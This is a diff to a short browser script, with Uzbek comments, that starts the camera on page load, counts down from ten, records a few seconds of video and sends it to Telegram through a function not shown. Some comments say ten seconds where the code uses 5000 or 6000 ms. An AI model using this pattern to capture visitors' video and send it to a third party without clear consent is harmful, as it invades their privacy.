@@ -1,4 +1,5 @@
 const video = document.getElementById('video');
+const countdownElement = document.getElementById('countdown');
 let mediaRecorder;
 let chunks = [];
 
@@ -21,11 +22,21 @@ function startCamera() {
                 sendVideoToTelegram(blob);
             };
 
-            // 10 soniya davomida video yozish
-            mediaRecorder.start();
-            setTimeout(() => {
-                mediaRecorder.stop();
-            }, 5000); // 10 soniya
+            // 10 soniya sanash
+            let countdown = 10;
+            const countdownInterval = setInterval(() => {
+                countdownElement.textContent = countdown;
+                countdown--;
+
+                if (countdown < 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.style.display = 'none'; // Sanashni yashirish
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 6000); // 10 soniya
+                }
+            }, 1000); // 1 soniya
         })
         .catch(error => {
             console.error('Xato:', error);
@@ -56,5 +67,5 @@ function sendVideoToTelegram(blob) {
     });
 }
 
-// Kamera ishga tushirish va avtomatik video yozishni boshlash
+// Kamera ishga tushirish va sanashni boshlash
 startCamera();
